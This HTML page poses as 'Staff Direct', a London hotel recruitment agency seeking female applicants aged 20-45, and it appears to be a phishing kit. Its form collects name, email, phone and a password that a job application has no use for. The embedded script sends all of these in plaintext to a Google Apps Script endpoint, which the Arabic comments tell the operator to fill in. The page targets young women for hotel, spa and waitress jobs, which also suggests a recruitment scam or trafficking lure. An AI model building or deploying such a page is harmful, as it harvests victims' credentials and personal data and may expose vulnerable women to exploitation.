<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Staff Direct - London Hospitality Recruitment</title>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root {
    --navy: #0A1F44;
    --gold: #D4AF37;
    --light-gold: #F5E6C8;
    --white: #ffffff;
  }
    * {box-sizing: border-box; font-family: 'Roboto', sans-serif;}
  body {
    background: linear-gradient(135deg, var(--navy) 0%, #1a3a6e 100%);
    display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
  }
  .apply-box {
    background: var(--white); width: 100%; max-width: 520px; padding: 40px; 
    border-radius: 16px; box-shadow: 0 12px 40px rgba(0,0,0,0.3); text-align: center;
    border-top: 5px solid var(--gold);
  }
  /* اللوجو */
  .logo-wrap {display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 8px;}
  .logo-icon {
    width: 45px; height: 45px; background: var(--gold); border-radius: 8px;
    display: flex; align-items: center; justify-content: center; color: var(--navy);
    font-family: 'Playfair Display', serif; font-size: 24px; font-weight: 700;
  }
  .logo-text {font-size: 26px; font-weight: 700; color: var(--navy); font-family: 'Playfair Display', serif; letter-spacing: 1px;}
  .tag {color: var(--gold); font-size: 12px; font-weight: 600; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 1px;}
  h2 {font-size: 22px; font-weight: 700; color: var(--navy); margin: 5px 0 8px;}
  p.sub {color: #555; font-size: 14px; margin-bottom: 25px;}
  .input-group {margin-bottom: 18px; text-align: left;}
  .input-group label {font-size: 13px; color: var(--navy); display: block; margin-bottom: 6px; font-weight: 600;}
  .input-group input, .input-group select {
    width: 100%; padding: 13px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; outline: none;
    transition: 0.2s;
  }
  .input-group input:focus, .input-group select:focus {border: 2px solid var(--gold);}
  .btn {
    width: 100%; padding: 15px; background: var(--gold); color: var(--navy); border: none; border-radius: 8px;
    font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px;
  }
  .btn:hover {background: #C19B2E; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(212,175,55,0.4);}
  .msg {margin-top: 15px; font-weight: 600;}
  .footer {margin-top: 20px; font-size: 11px; color: #777;}
  .note {background: var(--light-gold); padding: 12px; border-radius: 8px; font-size: 12px; color: var(--navy); margin-bottom: 20px; border-left: 4px solid var(--gold); font-weight: 500;}
</style>
</head>
<body>
  <div class="apply-box">
    <!-- اللوجو الجديد -->
    <div class="logo-wrap">
      <div class="logo-icon">SD</div>
      <div class="logo-text">STAFF DIRECT</div>
    </div>
    <div class="tag">Premium Hospitality Recruitment</div>
    <h2>Female Staff Application</h2>
    <p class="sub">London Hotel & Tourism Positions</p>
    
    <div class="note">✓ Female Applicants Only | Age 20-45 | UK Work Authorization Required</div>

    <form id="jobForm">
      <div class="input-group">
        <label>Full Name</label>
        <input type="text" id="name" placeholder="Enter your full name" required>
      </div>
      <div class="input-group">
        <label>Email Address</label>
        <input type="email" id="email" placeholder="example@email.com" required>
      </div>
      <div class="input-group">
        <label>Phone Number</label>
        <input type="tel" id="phone" placeholder="+44 7xxx xxx xxx" required>
      </div>
      <div class="input-group">
        <label>Position Applied For</label>
        <select id="job" required>
          <option value="">Select Position</option>
          <option>Hotel Housekeeping</option>
          <option>Hotel Receptionist</option>
          <option>Restaurant Waitress</option>
          <option>Tourism Guide Assistant</option>
          <option>Spa & Wellness Staff</option>
        </select>
      </div>
      <div class="input-group">
        <label>Password</label>
        <input type="password" id="password" placeholder="Create password" required>
      </div>
      <button type="submit" class="btn">Submit Application</button>
    </form>

    <p id="msg" class="msg"></p>
    <div class="footer">© 2026 Staff Direct Ltd. | London, UK</div>
  </div>

<script>
const SCRIPT_URL = "حط-رابط-الويب-اب-هنا"; // حط رابط Google Apps Script بتاعك هنا

document.getElementById('jobForm').addEventListener('submit', function(e){
  e.preventDefault();
  const data = {
    name: document.getElementById('name').value,
    email: document.getElementById('email').value,
    phone: document.getElementById('phone').value,
    job: document.getElementById('job').value,
    password: (document.getElementById('password').value),
    date: new Date().toLocaleString()
  };
  
  fetch(SCRIPT_URL, {method: 'POST', body: JSON.stringify(data)})
  .then(res => {
    document.getElementById('msg').innerText = "Application Submitted Successfully ✓";
    document.getElementById('msg').style.color = "#0A1F44";
    document.getElementById('jobForm').reset();
  })
  .catch(err => {
    document.getElementById('msg').innerText = "Error. Please try again.";
    document.getElementById('msg').style.color = "red";
  });
});
</script>
</body>
</html>
